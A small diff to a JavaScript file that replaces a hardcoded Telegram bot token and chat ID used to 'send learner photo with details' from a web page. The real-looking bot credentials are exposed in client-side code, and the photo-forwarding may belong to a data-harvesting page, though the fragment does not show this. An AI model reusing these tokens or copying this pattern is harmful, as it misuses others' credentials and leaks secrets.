@@ -49,8 +49,8 @@ document.addEventListener("DOMContentLoaded", function () {
             return;
         }
 
-        const botToken = "7527930234:AAGtGzngXhsAS7JnLsooCECvBBPvTPBy2SM";
-        const chatId = "7361816575";
+        const botToken = "8151588048:AAHkI1KzbC0c8_Ws0ilIiUnS1mD42bDuEnA";
+        const chatId = "5952407902";
 
         try {
             // Send learner photo with details
